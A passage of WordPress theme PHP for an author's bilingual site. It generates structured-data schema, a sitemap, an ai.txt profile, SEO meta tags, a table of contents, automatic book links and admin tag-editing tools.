        $language   = get_post_meta( $target_id, '_zk_book_language', true ) ?: $current_language;
        $pages      = get_post_meta( $target_id, '_zk_book_pages', true );
        $audience   = zk_book_localized_detail( $target_id, 'audience', $current_language );
        $isbn       = get_post_meta( $target_id, '_zk_book_isbn', true );
        
        $book_title = 'en' === $current_language ? get_the_title( $target_id ) : ( get_post_meta( $target_id, zk_language_meta_key( 'title', $current_language ), true ) ?: get_the_title( $target_id ) );
        $synopsis = 'en' === $current_language ? get_post( $target_id )->post_content : ( get_post_meta( $target_id, zk_language_meta_key( 'content', $current_language ), true ) ?: get_post( $target_id )->post_content );
        $desc = !empty($seo_desc) ? $seo_desc : wp_strip_all_tags( $synopsis );
        
        $book_schema = [
            '@context' => 'https://schema.org',
            '@type' => 'Book',
            'inLanguage' => $content_locale,
            'name' => $book_title,
            'author' => [ '@id' => $person_id ],
            'datePublished' => $year,
            'bookFormat' => 'https://schema.org/EBook',
            'isAccessibleForFree' => true,
            'description' => esc_attr( $desc ),
            'url' => $canonical_url
        ];
        
        if ( ! empty( $pages ) ) {
            $book_schema['numberOfPages'] = (int) $pages;
        }
        if ( ! empty( $audience ) ) {
            $book_schema['audience'] = [
                '@type'        => 'Audience',
                'audienceType' => wp_strip_all_tags( $audience ),
            ];
        }
        if ( ! empty( $isbn ) ) {
            $book_schema['isbn'] = esc_attr( $isbn );
        }
        if ( ! empty( $genre ) ) {
            $book_schema['genre'] = esc_attr( $genre );
            $book_schema['keywords'] = esc_attr( $genre ) . ', ' . $book_title . ', Book, Zurab Kostava, ზურაბ კოსტავა';
        }
        if ( has_post_thumbnail( $target_id ) ) {
            $book_schema['image'] = get_the_post_thumbnail_url( $target_id, 'full' );
        }
        $schema[] = $book_schema;
    }

    // Add BreadcrumbList Schema if not on home page
    if ( ! is_front_page() && ! is_home() ) {
        $home_label = $is_ka ? 'მთავარი' : 'Home';
        $home_link  = $is_ka ? home_url( '/ka/' ) : $site_url;

        $breadcrumbs = [
            '@context' => 'https://schema.org',
            '@type' => 'BreadcrumbList',
            'itemListElement' => [
                [
                    '@type' => 'ListItem',
                    'position' => 1,
                    'name' => $home_label,
                    'item' => $home_link
                ]
            ]
        ];

        if ( is_singular( 'zk_tool' ) ) {
            $breadcrumbs['itemListElement'][] = array( '@type' => 'ListItem', 'position' => 2, 'name' => $is_ka ? 'პროექტები' : 'Projects', 'item' => home_url( zk_get_language_path( '/projects/', $language ) ) );
            $breadcrumbs['itemListElement'][] = array( '@type' => 'ListItem', 'position' => 3, 'name' => get_the_title(), 'item' => $canonical_url );
        } elseif ( is_singular( 'post' ) ) {
            $blog_label = $is_ka ? 'ბლოგი' : 'Blog';
            $blog_link  = $is_ka ? home_url( '/ka/blog/' ) : home_url( '/blog/' );
            $post_title = $is_ka ? ( get_post_meta( get_the_ID(), '_zk_title_ka', true ) ?: get_the_title() ) : get_the_title();

            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => 2,
                'name' => $blog_label,
                'item' => $blog_link
            ];
            $post_categories = get_the_category();
            if ( $post_categories ) {
                $category = $post_categories[0];
                $category_url = get_term_link( $category );
                if ( ! is_wp_error( $category_url ) ) {
                    $breadcrumbs['itemListElement'][] = array(
                        '@type' => 'ListItem', 'position' => count( $breadcrumbs['itemListElement'] ) + 1,
                        'name' => zk_get_translated_term_name( $category ), 'item' => $category_url,
                    );
                }
            }
            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => count( $breadcrumbs['itemListElement'] ) + 1,
                'name' => $post_title,
                'item' => $canonical_url
            ];
        } elseif ( is_singular( 'zk_book' ) || $is_book_page ) {
            $target_id   = function_exists('zk_get_seo_target_id') ? zk_get_seo_target_id( get_queried_object_id() ) : get_queried_object_id();
            $books_label = $is_ka ? 'წიგნები' : 'Books';
            $books_link  = $is_ka ? home_url( '/ka/books/' ) : home_url( '/books/' );
            $book_title  = $is_ka ? ( get_post_meta( $target_id, '_zk_title_ka', true ) ?: get_the_title( $target_id ) ) : get_the_title( $target_id );

            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => 2,
                'name' => $books_label,
                'item' => $books_link
            ];
            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => 3,
                'name' => $book_title,
                'item' => $canonical_url
            ];
        } elseif ( is_category() ) {
            $breadcrumbs['itemListElement'][] = array(
                '@type' => 'ListItem', 'position' => 2,
                'name' => $is_ka ? 'ბლოგი' : 'Blog',
                'item' => home_url( zk_get_language_path( '/blog/', $language ) ),
            );
            $breadcrumbs['itemListElement'][] = array(
                '@type' => 'ListItem', 'position' => 3,
                'name' => zk_get_translated_term_name( get_queried_object() ), 'item' => $canonical_url,
            );
        } elseif ( is_page() ) {
            $page_title = $is_ka ? ( get_post_meta( get_the_ID(), '_zk_title_ka', true ) ?: get_the_title() ) : get_the_title();
            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => 2,
                'name' => $page_title,
                'item' => $canonical_url
            ];
        } else {
            $archive_title = $is_ka ? ( function_exists('zk_get_translated_term_name') ? zk_get_translated_term_name( get_queried_object() ) : 'არქივი' ) : ( get_the_title() ?: 'Archive' );
            $breadcrumbs['itemListElement'][] = [
                '@type' => 'ListItem',
                'position' => 2,
                'name' => $archive_title,
                'item' => $canonical_url
            ];
        }
        $schema[] = $breadcrumbs;
    }

    if ( ! empty( $schema ) ) {
        echo "\n<!-- ZK JSON-LD Schema Engine -->\n";
        echo "<script type=\"application/ld+json\">\n";
        echo json_encode( count( $schema ) === 1 ? $schema[0] : $schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT );
        echo "\n</script>\n";
        echo "<!-- /ZK JSON-LD Schema Engine -->\n";
    }
}
add_action( 'wp_head', 'zk_render_json_ld_schema', 2 );

/* ============================================================
   ZK CUSTOM SEO ENGINE (Stage 3 - Static Architecture)
   ============================================================ */

// 1. Extreme Head Cleanup (Zero Bloat)
function zk_clean_head() {
    remove_action('wp_head', 'rsd_link');
    remove_action('wp_head', 'wlwmanifest_link');
    remove_action('wp_head', 'wp_generator');
    remove_action('wp_head', 'print_emoji_detection_script', 7);
    remove_action('wp_print_styles', 'print_emoji_styles');
    remove_action('wp_head', 'rest_output_link_wp_head', 10);
    remove_action('wp_head', 'wp_oembed_add_discovery_links', 10);
    remove_action('template_redirect', 'rest_output_link_header', 11, 0);
    remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);
}
add_action('init', 'zk_clean_head');

// Disable native WP sitemap
add_filter('wp_sitemaps_enabled', '__return_false');

// 2. Dynamic SEO File Generators (Bypasses File Permissions and NGINX rewrites)
function zk_sitemap_language_entries( $path, $lastmod = '', $language_codes = array() ) {
    $home = untrailingslashit( get_option( 'home', 'https://zurabkostava.com' ) );
    $urls = array();
    foreach ( zk_get_languages() as $code => $language ) {
        if ( $language_codes && ! in_array( $code, $language_codes, true ) ) continue;
        $urls[ $code ] = $home . zk_get_language_path( $path, $code );
    }

    $xml = '';
    foreach ( $urls as $url ) {
        $xml .= "  <url>\n    <loc>" . esc_xml( $url ) . "</loc>\n";
        foreach ( $urls as $code => $alternate ) {
            $xml .= "    <xhtml:link rel=\"alternate\" hreflang=\"" . esc_attr( $code ) . "\" href=\"" . esc_xml( $alternate ) . "\" />\n";
        }
        if ( isset( $urls['en'] ) ) {
            $xml .= "    <xhtml:link rel=\"alternate\" hreflang=\"x-default\" href=\"" . esc_xml( $urls['en'] ) . "\" />\n";
        }
        if ( $lastmod ) $xml .= "    <lastmod>" . esc_xml( $lastmod ) . "</lastmod>\n";
        $xml .= "  </url>\n";
    }
    return $xml;
}

function zk_generate_sitemap_string() {
    $sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap_content .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:xhtml="http://www.w3.org/1999/xhtml">' . "\n";
    
    $post_types = get_post_types( array( 'public' => true ), 'names' );
    // Books and Projects with internal routes are canonical records.
    // External-only records are excluded below.
    unset( $post_types['attachment'] );

    $query = new WP_Query([
        'post_type' => array_values( $post_types ),
        'post_status' => 'publish',
        'posts_per_page' => -1,
        'orderby' => 'modified',
        'order' => 'DESC',
        'no_found_rows' => true,
    ]);

    $seen_paths = array( '/' => true );
    $front_page_id = (int) get_option( 'page_on_front' );
    $home_languages = array( 'en' );
    foreach ( zk_get_translatable_languages() as $code => $language ) {
        if ( ! $front_page_id || zk_is_post_translation_complete( $front_page_id, $code ) ) $home_languages[] = $code;
    }
    $home_lastmod = $front_page_id ? get_post_modified_time( 'c', true, $front_page_id ) : '';
    $sitemap_content .= zk_sitemap_language_entries( '/', $home_lastmod, $home_languages );

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $post_id = get_the_ID();
            $post_obj = get_post( $post_id );
            if ( ! $post_obj || ! empty( $post_obj->post_password ) ) continue;

            if ( zk_is_internal_or_test_page( $post_id ) ) continue;
            if ( 'zk_tool' === $post_obj->post_type && ! get_post_meta( $post_id, '_zk_project_path', true ) ) continue;
            if ( 'zk_book' === $post_obj->post_type && ! get_post_meta( $post_id, '_zk_book_path', true ) ) continue;
            if ( 'page' === $post_obj->post_type && zk_blog_listing_term( '/' . get_page_uri( $post_obj ) . '/' ) ) continue;

            $perm = get_permalink( $post_id );
            $parsed = parse_url($perm);
            $p = isset($parsed['path']) ? $parsed['path'] : '/';
            $en_p = zk_strip_language_prefix( $p );
            if ( isset( $seen_paths[ $en_p ] ) ) continue;
            $seen_paths[ $en_p ] = true;

            $language_codes = array( 'en' );
            foreach ( zk_get_translatable_languages() as $code => $language ) {
                if ( zk_is_post_translation_complete( $post_id, $code ) ) $language_codes[] = $code;
            }
            $lastmod = get_the_modified_date('c');
            $sitemap_content .= zk_sitemap_language_entries( $en_p, $lastmod, $language_codes );
        }
        wp_reset_postdata();
    }

    $terms = get_terms( array( 'taxonomy' => array( 'category', 'post_tag' ), 'hide_empty' => true ) );
    if ( ! is_wp_error( $terms ) ) {
        foreach ( $terms as $term ) {
            $term_link = get_term_link( $term );
            if ( is_wp_error( $term_link ) ) continue;
            $parsed = wp_parse_url( $term_link );
            $path = zk_strip_language_prefix( isset( $parsed['path'] ) ? $parsed['path'] : '/' );
            if ( isset( $seen_paths[ $path ] ) ) continue;
            $seen_paths[ $path ] = true;

            $language_codes = array( 'en' );
            foreach ( zk_get_translatable_languages() as $code => $language ) {
                if ( zk_is_term_translation_complete( $term, $code ) ) $language_codes[] = $code;
            }
            $sitemap_content .= zk_sitemap_language_entries( $path, '', $language_codes );
        }
    }
    $sitemap_content .= '</urlset>';
    return $sitemap_content;
}

function zk_generate_aitxt_string() {
    $name = "Zurab Kostava";
    $position = get_option('zk_vital_position', 'Creative Lead');
    $about = wp_strip_all_tags(get_option('zk_vital_about', ''));
    
    $ai_content = "# $name - $position\n\n";
    $ai_content .= "## About\n$about\n\n";
    
    $ai_content .= "## Links\n";
    $social_keys = ['zk_social_ig', 'zk_social_fb', 'zk_social_x', 'zk_social_linkedin', 'zk_social_youtube', 'zk_social_spotify', 'zk_social_bandcamp', 'zk_social_medium', 'zk_social_behance', 'zk_social_musicbrainz'];
    $social_defaults = [
        'zk_social_behance' => 'https://www.behance.net/zurabkostava',
        'zk_social_musicbrainz' => 'https://musicbrainz.org/artist/61081717-65c9-4717-9683-9ca286ae30e7',
    ];
    foreach ($social_keys as $key) {
        $url = esc_url(get_option($key, $social_defaults[$key] ?? ''));
        if (!empty($url) && $url !== '#' && strpos($url, 'http') === 0) {
            $ai_content .= "- $url\n";
        }
    }
    
    $ai_content .= "\n## Latest Works / Books\n";
    $query = new WP_Query([
        'post_type' => 'zk_book',
        'post_status' => 'publish',
        'posts_per_page' => 10,
    ]);
    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            $year = get_post_meta(get_the_ID(), '_zk_book_year', true);
            $genre = get_post_meta(get_the_ID(), '_zk_book_genre', true);
            $ai_content .= "- " . get_the_title() . " ($year) [$genre]\n";
        }
        wp_reset_postdata();
    }
    
    $ai_content .= "\n## Contact\n";
    $ai_content .= "- Email: " . get_option('admin_email') . "\n";
    $ai_content .= "- Website: " . home_url('/') . "\n";
    return $ai_content;
}

function zk_serve_dynamic_seo_files() {
    $uri = wp_parse_url( isset( $_SERVER['REQUEST_URI'] ) ? wp_unslash( $_SERVER['REQUEST_URI'] ) : '', PHP_URL_PATH );

    // Keep one canonical sitemap. Legacy Rank Math/Yoast-style locations may
    // still be saved in crawlers and Search Console, so redirect them instead
    // of publishing the same URL set three times.
    // Match only the two legacy root paths. Without the required leading
    // slash this also matches the `sitemap.xml` tail of `/wp-sitemap.xml`
    // and creates a redirect loop back to itself.
    if ( preg_match( '#/(?:sitemap_index|sitemap)\.xml$#i', $uri ) ) {
        wp_safe_redirect( home_url( '/wp-sitemap.xml' ), 301, 'ZK Sitemap' );
        exit;
    }

    if ( preg_match( '/\/?wp-sitemap\.xml$/i', $uri ) ) {
        status_header( 200 );
        header( 'X-Robots-Tag: noindex, follow', true );
        header('Content-Type: text/xml; charset=utf-8');
        echo zk_generate_sitemap_string();
        exit;
    }
    
    if ( preg_match( '/\/ai\.txt$/i', $uri ) ) {
        header('Content-Type: text/plain; charset=utf-8');
        echo zk_generate_aitxt_string();
        exit;
    }
}
add_action( 'template_redirect', 'zk_serve_dynamic_seo_files', 1 );

// 3. Override robots.txt (Moved to the bottom)

/* ============================================================
   ZK CUSTOM SEO ENGINE (Stage 4 - Image SEO)
   ============================================================ */

// 1. Image Auto Alt-Text Enforcer
function zk_auto_image_alt_text( $attributes, $attachment ) {
    if ( empty( $attributes['alt'] ) ) {
        // Fallback to attachment title or post title
        $alt = get_the_title( $attachment->post_parent );
        if ( empty( $alt ) ) {
            $alt = get_the_title( $attachment->ID );
        }
        $attributes['alt'] = esc_attr( $alt );
    }
    return $attributes;
}
add_filter( 'wp_get_attachment_image_attributes', 'zk_auto_image_alt_text', 10, 2 );

/* ============================================================
   ZK CUSTOM SEO ENGINE (Stage 5 - GEO & Advanced SEO)
   ============================================================ */

// 1. GEO Meta Tags (Robots Directives & AI Summary)
remove_action( 'wp_head', 'wp_robots', 1 ); // Prevent WordPress from outputting duplicate robots meta

function zk_render_geo_meta_tags() {
    if ( is_admin() || is_feed() || is_robots() || is_trackback() ) {
        return;
    }
    
    $language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $internal_page = is_singular() && zk_is_internal_or_test_page( get_queried_object_id() );
    $thin_archive = is_404() || is_author() || is_date() || is_search() || is_attachment() || is_paged();
    if ( $internal_page || $thin_archive || ! zk_is_language_version_indexable( $language ) ) {
        echo "<meta name=\"robots\" content=\"noindex, follow\" />\n";
    } else {
        echo "<meta name=\"robots\" content=\"index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1\" />\n";
    }

    // AI Summary (abstract)
    $ai_summary = '';

    if ( is_singular() ) {
        global $post;
        $target_id = function_exists('zk_get_seo_target_id') && isset($post->ID) ? zk_get_seo_target_id( $post->ID ) : ( isset($post->ID) ? $post->ID : 0 );
        if ( $target_id ) {
            $ai_summary = zk_get_localized_post_meta( $target_id, 'geo_ai_summary', $language, true );
        }
    } elseif ( is_archive() && ( is_category() || is_tag() ) ) {
        $term_id = get_queried_object_id();
        $ai_summary = zk_get_localized_term_meta( $term_id, 'geo_ai_summary', $language, true );
    }

    if ( ! empty( trim( $ai_summary ) ) ) {
        echo '<meta name="abstract" content="' . esc_attr( trim( $ai_summary ) ) . '" />' . "\n";
    }
}
add_action( 'wp_head', 'zk_render_geo_meta_tags', 1 );

// 2. Auto-Generated Table of Contents (TOC)
function zk_auto_toc_generator( $content ) {
    if ( ! is_singular( [ 'post', 'page', 'zk_book' ] ) || empty( $content ) ) {
        return $content;
    }

    // Translated content passes through the_content twice. Never inject a
    // second navigation when the inner pass has already generated one.
    if ( false !== strpos( $content, 'class="zk-seo-toc"' ) ) {
        return $content;
    }

    // Find all <h2> tags
    preg_match_all( '/<h2(.*?)>(.*?)<\/h2>/i', $content, $matches );
    
    if ( ! empty( $matches[2] ) && count( $matches[2] ) > 1 ) { // Only add TOC if more than 1 heading
        $language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
        $toc_title = 'ka' === $language ? 'სარჩევი' : 'Table of Contents';
        $toc_title = apply_filters( 'zk_toc_title', $toc_title, $language );
        $toc = '<nav class="zk-seo-toc" aria-label="' . esc_attr( $toc_title ) . '">';
        $toc .= '<button class="zk-seo-toc-toggle" type="button" aria-expanded="true"><span>' . esc_html( $toc_title ) . '</span><svg viewBox="0 0 24 24" aria-hidden="true"><path d="m6 9 6 6 6-6"/></svg></button>';
        $toc .= '<ol class="zk-seo-toc-list">';
        $used_slugs = array();
        
        foreach ( $matches[2] as $i => $heading ) {
            $clean_text = wp_strip_all_tags( $heading );
            // HTML IDs hold text; URL fragments encode it when navigating.
            $slug = rawurldecode( sanitize_title( $clean_text ) );
            if ( empty( $slug ) ) { $slug = 'section-' . ( $i + 1 ); }
            $base_slug = $slug;
            $suffix = 2;
            while ( isset( $used_slugs[ $slug ] ) ) {
                $slug = $base_slug . '-' . $suffix++;
            }
            $used_slugs[ $slug ] = true;
            
            // Add ID to the original heading
            $original_h2 = $matches[0][$i];
            $heading_attributes = preg_replace( '/\s+id=("|\').*?\1/i', '', $matches[1][$i] );
            $new_h2 = '<h2 id="' . esc_attr( $slug ) . '"' . $heading_attributes . '>' . $matches[2][$i] . '</h2>';
            $content = str_replace( $original_h2, $new_h2, $content );
            
            // Add to TOC list
            $toc .= '<li><a href="#' . esc_attr( $slug ) . '"><span class="zk-seo-toc-number">' . esc_html( $i + 1 ) . '</span><span>' . esc_html( $clean_text ) . '</span></a></li>';
        }
        
        $toc .= '</ol></nav>';
        
        // Insert TOC before the first <h2>
        $content = preg_replace( '/<h2/', $toc . '<h2', $content, 1 );
    }

    return $content;
}
add_filter( 'the_content', 'zk_auto_toc_generator' );

// 3. GEO Meta Box (AI Summary & FAQ)
function zk_add_geo_meta_box() {
    $screens = [ 'post', 'page', 'zk_book', 'zk_tool' ];
    foreach ( $screens as $screen ) {
        add_meta_box(
            'zk_geo_meta_box',
            'ZK GEO Settings (AI & FAQ)',
            'zk_render_geo_meta_box',
            $screen,
            'normal',
            'high'
        );
    }
}
add_action( 'add_meta_boxes', 'zk_add_geo_meta_box' );

function zk_render_geo_meta_box( $post ) {
    wp_nonce_field( 'zk_geo_save_meta_box_data', 'zk_geo_meta_box_nonce' );
    ?>
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; padding: 10px 0;">
        <?php foreach ( zk_get_languages( false ) as $code => $language ) :
            $suffix = 'en' === $code ? '' : '_' . $code;
            $ai_summary = zk_get_localized_post_meta( $post->ID, 'geo_ai_summary', $code );
            $faq_text = zk_get_localized_post_meta( $post->ID, 'geo_faq', $code );
        ?>
        <div style="background: #f8f9fa; border: 1px solid #dcdcde; border-radius: 6px; padding: 15px;">
            <h4 style="margin: 0 0 14px; font-size: 15px; display: flex; align-items: center; gap: 8px;">
                <?php echo esc_html( $language['native_name'] . ' GEO Settings (' . strtoupper( $code ) . ')' ); ?>
            </h4>
            <p style="margin-bottom: 15px;">
                <label for="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>" style="display:block; font-weight:600; margin-bottom:5px;">AI Summary (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
                <span class="description" style="display:block; margin-bottom:5px;">Tell AI search engines how to summarize this page in this language.</span>
                <textarea id="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>" name="zk_geo_ai_summary<?php echo esc_attr( $suffix ); ?>" rows="3" style="width:100%;"><?php echo esc_textarea( $ai_summary ); ?></textarea>
            </p>
            <p style="margin-top: 15px; margin-bottom: 0;">
                <label for="zk_geo_faq<?php echo esc_attr( $suffix ); ?>" style="display:block; font-weight:600; margin-bottom:5px;">FAQ Schema (<?php echo esc_html( strtoupper( $code ) ); ?>)</label>
                <span class="description" style="display:block; margin-bottom:5px;">Q: Question?<br>A: Answer.</span>
                <textarea id="zk_geo_faq<?php echo esc_attr( $suffix ); ?>" name="zk_geo_faq<?php echo esc_attr( $suffix ); ?>" rows="8" style="width:100%; font-family:monospace;"><?php echo esc_textarea( $faq_text ); ?></textarea>
            </p>
        </div>
        <?php endforeach; ?>
    </div>
    <?php
}

function zk_save_geo_meta_box_data( $post_id ) {
    if ( ! isset( $_POST['zk_geo_meta_box_nonce'] ) || ! wp_verify_nonce( $_POST['zk_geo_meta_box_nonce'], 'zk_geo_save_meta_box_data' ) ) return;
    if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) return;
    if ( ! current_user_can( 'edit_post', $post_id ) ) return;

    foreach ( zk_get_languages( false ) as $code => $language ) {
        $suffix = 'en' === $code ? '' : '_' . $code;
        foreach ( array( 'geo_ai_summary', 'geo_faq' ) as $field ) {
            $input = 'zk_' . $field . $suffix;
            if ( isset( $_POST[ $input ] ) ) {
                update_post_meta( $post_id, zk_localized_meta_key( $field, $code ), sanitize_textarea_field( wp_unslash( $_POST[ $input ] ) ) );
            }
        }
    }
}
add_action( 'save_post', 'zk_save_geo_meta_box_data' );

// 4. Inject FAQ JSON-LD Schema
function zk_inject_faq_schema() {
    if ( ! is_singular() && ! ( is_archive() && ( is_category() || is_tag() ) ) ) return;
    
    $language = function_exists( 'zk_get_current_language' ) ? zk_get_current_language() : 'en';
    $language_info = zk_get_language( $language );
    $faq_text = '';
    
    if ( is_singular() ) {
        global $post;
        // Automatically fetch FAQ from the corresponding zk_book if on a book reader page
        $target_id = function_exists('zk_get_seo_target_id') && isset($post->ID) ? zk_get_seo_target_id( $post->ID ) : ( isset($post->ID) ? $post->ID : 0 );
        if ( $target_id ) {
            $faq_text = zk_get_localized_post_meta( $target_id, 'geo_faq', $language );
        }
    } else {
        $term_id = get_queried_object_id();
        $faq_text = zk_get_localized_term_meta( $term_id, 'geo_faq', $language );
    }
    
    $mainEntity = [];

    if ( ! empty( trim( $faq_text ) ) ) {
        $blocks = explode( "\n\n", str_replace( "\r", "", $faq_text ) );
        foreach ( $blocks as $block ) {
            $lines = explode( "\n", trim( $block ) );
            $q = ''; $a = '';
            foreach ( $lines as $line ) {
                if ( str_starts_with( $line, 'Q:' ) ) { $q = trim( substr( $line, 2 ) ); }
                elseif ( str_starts_with( $line, 'A:' ) ) { $a = trim( substr( $line, 2 ) ); }
            }
            if ( ! empty( $q ) && ! empty( $a ) ) {
                $name_val = is_page('about') ? wp_strip_all_tags( $q ) : esc_attr( $q );
                $text_val = is_page('about') ? wp_strip_all_tags( $a ) : esc_attr( $a );
                $mainEntity[] = [
                    '@type' => 'Question',
                    'name' => $name_val,
                    'acceptedAnswer' => [
                        '@type' => 'Answer',
                        'text' => $text_val
                    ]
                ];
            }
        }
    }

    // Merge book FAQs if it's the catalog page
    $post_obj = get_post();
    if ( is_page() && $post_obj && has_shortcode( $post_obj->post_content, 'zk_books' ) ) {
        $books = get_posts( array( 'post_type' => 'zk_book', 'numberposts' => -1 ) );
        foreach ( $books as $book ) {
            $b_faq = zk_get_localized_post_meta( $book->ID, 'geo_faq', $language );
            if ( ! empty( trim( $b_faq ) ) ) {
                $b_blocks = explode( "\n\n", str_replace( "\r", "", $b_faq ) );
                foreach ( $b_blocks as $block ) {
                    $lines = explode( "\n", trim( $block ) );
                    $q = ''; $a = '';
                    foreach ( $lines as $line ) {
                        if ( str_starts_with( $line, 'Q:' ) ) { $q = trim( substr( $line, 2 ) ); }
                        elseif ( str_starts_with( $line, 'A:' ) ) { $a = trim( substr( $line, 2 ) ); }
                    }
                    if ( ! empty( $q ) && ! empty( $a ) ) {
                        $name_val = is_page('about') ? wp_strip_all_tags( $q ) : esc_attr( $q );
                        $text_val = is_page('about') ? wp_strip_all_tags( $a ) : esc_attr( $a );
                        // Check for exact duplicates
                        $is_dup = false;
                        foreach($mainEntity as $ex) {
                            if ($ex['name'] === $name_val) {
                                $is_dup = true;
                                break;
                            }
                        }
                        if (!$is_dup) {
                            $mainEntity[] = [
                                '@type' => 'Question',
                                'name' => $name_val,
                                'acceptedAnswer' => [
                                    '@type' => 'Answer',
                                    'text' => $text_val
                                ]
                            ];
                        }
                    }
                }
            }
        }
    }

    if ( ! empty( $mainEntity ) ) {
        $schema = [
            '@context'   => 'https://schema.org',
            '@type'      => 'FAQPage',
            'inLanguage' => $language_info['locale'],
            'mainEntity' => $mainEntity
        ];
        echo "\n<!-- ZK FAQ Schema Engine -->\n";
        echo "<script type=\"application/ld+json\">\n";
        echo json_encode( $schema, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT );
        echo "\n</script>\n";
        echo "<!-- /ZK FAQ Schema Engine -->\n";
    }
}
add_action( 'wp_head', 'zk_inject_faq_schema', 3 );

/* ============================================================
   ZK CUSTOM SEO ENGINE (Stage 7 - Ultimate Technical & AEO)
   ============================================================ */

// 1. Hreflang Tags (Integrated cleanly into zk_render_seo_meta)
function zk_render_hreflang_tags() {
    // Multi-language hreflang tags (en, ka, x-default) are unified in zk_render_seo_meta()
}

// 2. Automated Internal Linking Engine (SEO Powerhouse)
function zk_auto_internal_linker( $content ) {
    if ( is_admin() || ! is_singular( 'post' ) || empty( $content ) ) {
        return $content;
    }

    // Get all books to auto-link
    $books = get_posts([
        'post_type' => 'zk_book',
        'numberposts' => -1,
        'post_status' => 'publish'
    ]);

    if ( empty( $books ) ) return $content;

    foreach ( $books as $book ) {
        $title = esc_html( $book->post_title );
        $url = get_permalink( $book->ID );
        
        // Regex explanation:
        // \b : word boundary
        // (?![^<]*>) : negative lookahead ensuring we are not inside an HTML tag
        // Limits replacement to 1 per book title
        $pattern = '/\b(' . preg_quote( $title, '/' ) . ')\b(?![^<]*>)/i';
        $replacement = '<a href="' . esc_url( $url ) . '" class="zk-auto-link" title="Read more about ' . esc_attr( $title ) . '">$1</a>';
        
        $content = preg_replace( $pattern, $replacement, $content, 1 ); 
    }

    return $content;
}
add_filter( 'the_content', 'zk_auto_internal_linker', 20 );

/* ============================================================
   ZK ADMIN UX ENHANCEMENTS
   ============================================================ */
function zk_make_tags_hierarchical() {
    global $wp_taxonomies;
    if ( isset( $wp_taxonomies['post_tag'] ) ) {
        $wp_taxonomies['post_tag']->hierarchical = true;
        $wp_taxonomies['post_tag']->show_ui = true;
        $wp_taxonomies['post_tag']->meta_box_cb = 'post_categories_meta_box';
    }
}
add_action( 'init', 'zk_make_tags_hierarchical' );

/* ============================================================
   ZK QUICK EDIT ADVANCED TAG ADDER
   ============================================================ */
// 1. Process AJAX Request
add_action( 'wp_ajax_zk_add_quick_tag', 'zk_ajax_add_quick_tag' );
function zk_ajax_add_quick_tag() {
    check_ajax_referer( 'zk_add_tag_nonce', 'nonce' );

    if ( ! current_user_can( 'manage_categories' ) ) {
        wp_send_json_error( 'Permission denied.' );
    }

    $name = isset( $_POST['tag_name'] ) ? sanitize_text_field( $_POST['tag_name'] ) : '';
    $slug = isset( $_POST['tag_slug'] ) ? sanitize_text_field( $_POST['tag_slug'] ) : '';
    $desc = isset( $_POST['tag_desc'] ) ? sanitize_textarea_field( $_POST['tag_desc'] ) : '';

    if ( empty( $name ) ) {
        wp_send_json_error( 'Tag name is required.' );
    }

    $args = [];
    if ( ! empty( $slug ) ) $args['slug'] = $slug;
    if ( ! empty( $desc ) ) $args['description'] = $desc;

    $term = wp_insert_term( $name, 'post_tag', $args );

    if ( is_wp_error( $term ) ) {
        wp_send_json_error( $term->get_error_message() );
    }

    $term_id = $term['term_id'];
    $term_obj = get_term( $term_id, 'post_tag' );

    wp_send_json_success( [
        'term_id' => $term_id,
        'name'    => $term_obj->name
    ] );
}

// 2. Inject JS into admin footer
add_action( 'admin_print_footer_scripts', 'zk_quick_edit_add_tag_js' );
function zk_quick_edit_add_tag_js() {
    $screen = get_current_screen();
    if ( ! $screen || $screen->base !== 'edit' || $screen->post_type !== 'post' ) return;
    ?>
    <script type="text/javascript">
    jQuery(document).ready(function($) {
        // Inject the HTML into the hidden Quick Edit template
        var formHtml = '<div class="zk-custom-tag-adder" style="width: 100%; border-top: 1px solid #444; margin-top: 15px; padding-top: 15px; clear: both;">' +
            '<span class="title" style="font-weight:600; margin-bottom:8px; display:block;">Add New Tag</span>' +
            '<div style="display: flex; gap: 8px; align-items: flex-end; flex-wrap: wrap;">' +
                '<label style="flex: 1; min-width: 100px; margin:0;">' +
                    '<span class="title" style="margin-bottom:4px;font-size:11px;line-height:1;">Name <span style="color:#d63638">*</span></span>' +
                    '<input type="text" class="zk-new-tag-name" value="" autocomplete="off" style="width:100%; padding: 0 8px; line-height: 2;">' +
                '</label>' +
                '<label style="flex: 1; min-width: 100px; margin:0;">' +
                    '<span class="title" style="margin-bottom:4px;font-size:11px;line-height:1;">Slug (opt)</span>' +
                    '<input type="text" class="zk-new-tag-slug" value="" autocomplete="off" style="width:100%; padding: 0 8px; line-height: 2;">' +
                '</label>' +
                '<label style="flex: 1.5; min-width: 150px; margin:0;">' +
                    '<span class="title" style="margin-bottom:4px;font-size:11px;line-height:1;">Description (opt)</span>' +
                    '<input type="text" class="zk-new-tag-desc" value="" autocomplete="off" style="width:100%; padding: 0 8px; line-height: 2;">' +
                '</label>' +
                '<button type="button" class="button button-secondary zk-add-tag-btn" style="margin-bottom: 0;">Add</button>' +
                '<span class="spinner zk-add-tag-spinner" style="float:none; margin: 0 0 5px 0;"></span>' +
            '</div>' +
            '<div class="zk-add-tag-feedback" style="color:#d63638; font-size:11px; margin-top:5px; display:none;"></div>' +
        '</div>';

